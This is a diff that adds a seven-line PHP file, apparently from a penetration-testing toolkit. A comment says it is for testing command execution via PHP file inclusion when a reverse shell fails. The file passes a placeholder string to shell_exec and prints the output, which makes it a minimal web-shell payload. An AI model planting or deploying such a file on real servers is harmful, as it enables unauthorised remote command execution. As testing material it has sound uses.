@@ -1,0 +1,7 @@
+<?php
+#used to test php file include command execution if having issues with a reverse shell.
+
+$output = shell_exec('command_goes_here');
+echo "<pre>$output</pre>";
+
+?>
